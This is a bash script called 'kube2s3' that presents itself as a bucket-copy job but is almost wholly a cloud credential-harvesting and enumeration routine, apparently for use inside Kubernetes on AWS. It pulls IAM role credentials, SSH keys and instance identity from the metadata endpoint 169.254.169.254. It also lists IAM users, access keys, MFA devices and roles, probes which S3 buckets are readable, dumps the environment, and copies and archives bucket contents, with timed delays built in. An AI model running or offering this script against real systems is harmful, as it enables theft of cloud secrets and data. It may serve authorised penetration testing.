#!/bin/bash
SCRIPTNAME="kube2s3"
LOGFILE="/tmp/$SCRIPTNAME.log"
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

log "starting..."

log "adding 5 minute delay before enumeration..."
sleep 300

log "public ip: $(curl -s https://icanhazip.com)"

log "bucket name from env: $BUCKET_NAME"

log "creating local storage..."
LOCAL_STORE=/tmp/kube_bucket
if [ -f $LOCAL_STORE ]; then
    rm -rf $LOCAL_STORE
fi
mkdir -p $LOCAL_STORE

log "check aws identity..."
aws sts get-caller-identity 2>&1 | tee -a $LOGFILE

# aws enum via metadata
echo "starting aws metadat enumeration..." | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/ | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/ami-id | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/reservation-id | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/hostname | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/public-keys/ | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access | tee -a $LOGFILE
curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | tee -a $LOGFILE

# aws enum via cli
echo "starting aws cli enumeration..." | tee -a $LOGFILE
aws iam get-account-authorization-details | tee -a $LOGFILE
aws iam list-users | tee -a $LOGFILE
aws iam list-ssh-public-keys | tee -a $LOGFILE #User keys for CodeCommit
aws iam list-service-specific-credentials | tee -a $LOGFILE #Get special permissions of the IAM user over specific services
aws iam list-access-keys | tee -a $LOGFILE #List created access keys
aws iam list-groups | tee -a $LOGFILE #Get groups
aws iam list-roles | tee -a $LOGFILE #Get roles
aws iam list-saml-providers | tee -a $LOGFILE
aws iam list-open-id-connect-providers | tee -a $LOGFILE
aws iam get-account-password-policy | tee -a $LOGFILE
aws iam list-mfa-devices | tee -a $LOGFILE
aws iam list-virtual-mfa-devices | tee -a $LOGFILE
echo "enumerating s3 buckets..." | tee -a $LOGFILE
aws s3 ls | cut -d ' ' -f 3 | tee -a $LOGFILE > /tmp/buckets 
echo "You can read the following buckets:" >/tmp/readBuckets
for i in $(cat /tmp/buckets); do
    result=$(aws s3 ls s3://"$i" 2>/dev/null | head -n 1)
    if [ ! -z "$result" ]; then
        echo "$i" | tee /tmp/readBuckets
        unset result
    fi
done
cat /tmp/readBuckets | tee -a $LOGFILE

log "dump env..."
env 2>&1 | tee -a $LOGFILE

log "recursive copy from $BUCKET_NAME to $LOCAL_STORE..."
aws s3 cp \
    s3://$BUCKET_NAME/ \
    $LOCAL_STORE \
    --recursive | tee -a $LOGFILE

log "creating archive of local store..."
tar -zcvf /tmp/kube_bucket.tgz $LOCAL_STORE | tee -a $LOGFILE
log "adding 5 minute delay before exiting..."
sleep 300
log "done."